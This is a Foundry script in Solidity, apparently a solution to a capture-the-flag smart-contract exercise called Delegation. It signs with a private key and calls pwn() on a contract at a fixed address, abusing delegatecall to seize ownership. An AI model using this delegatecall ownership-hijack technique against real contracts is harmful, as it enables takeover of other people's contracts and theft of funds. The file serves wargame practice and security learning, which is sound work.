// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import {Script} from "forge-std/Script.sol";

contract DelegationSolution is Script {
    Delegation public delegation = Delegation(0x419cA09c4cD0B061fea4145450e35A9fd44598db);
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        (bool result,) = address(delegation).call(abi.encodeWithSignature("pwn()"));

        require(result, "Failed");

        vm.stopBroadcast();
    }
}